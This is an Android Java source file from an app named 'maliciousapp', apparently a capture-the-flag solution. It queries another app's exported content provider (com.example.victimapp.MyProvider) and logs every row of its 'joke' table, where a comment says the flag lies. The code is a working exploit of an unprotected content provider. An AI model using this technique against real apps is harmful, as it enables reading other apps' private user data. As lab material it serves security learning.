package com.example.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.UriMatcher;
import android.database.Cursor;
import android.database.sqlite.SQLiteQueryBuilder;
import android.net.Uri;
import android.os.Bundle;
import android.provider.UserDictionary;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @SuppressLint("Range")
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String PROVIDER_NAME = "com.example.victimapp.MyProvider";
        String TABLE_NAME = "joke";
        Uri jokes = Uri.parse("content://" + PROVIDER_NAME + "/" + TABLE_NAME);

        // Does a query against the table and returns a Cursor object
        Cursor cursor = getContentResolver().query(
                jokes, null, null, null, null);

        // Some providers return null if an error occurs, others throw an exception
        if (null == cursor) {
            Log.e("inspect", "error");
        // If the Cursor is empty, the provider found no matches
        } else if (cursor.getCount() < 1) {
            Log.e("inspect", "unsuccessful");
        } else {
            Log.e("inspect ", String.valueOf(cursor));
            String joke = "joke";
            String author = "author";
            if (cursor.moveToFirst()) {
                do{
                    //print all, among them there's the flag
                    Log.e("inspect", cursor.getString(cursor.getColumnIndex(author)));
                    Log.e("inspect", cursor.getString(cursor.getColumnIndex(joke)));

                } while (cursor.moveToNext());
            }

        }
    }
}